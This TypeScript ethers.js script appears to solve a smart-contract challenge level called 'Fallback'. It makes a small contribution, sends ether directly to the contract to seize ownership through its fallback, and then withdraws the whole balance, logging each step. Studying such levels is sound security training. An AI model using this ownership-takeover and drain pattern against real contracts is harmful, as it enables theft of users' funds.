import { ethers, Signer } from "ethers";
import { getSigner } from "./signer";

import { Fallback__factory } from "../typechain/ethers-v5";
main()
  .then(() => {
    console.log("Done!");
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });


async function main() {

  const level = "0xD855A79471F18e8B6c5E565A61b7395999A32D24";
  const signer = getSigner();  
  const fallout = Fallback__factory.connect(level, signer);
  console.log("owner:",await fallout.owner());
  console.log("contribute");
  console.log(await fallout.contribute({ value: ethers.utils.parseEther("0.0001") }));
  console.log("take over contract");
  await signer.sendTransaction({ to: level, value: ethers.utils.parseEther("0.01") })
  console.log("owner:",await fallout.owner());
  console.log("withdraw all");
  console.log("balances before:",await signer.provider?.getBalance(level));
  await fallout.withdraw();
  console.log("balances after:",await signer.provider?.getBalance(level));
}
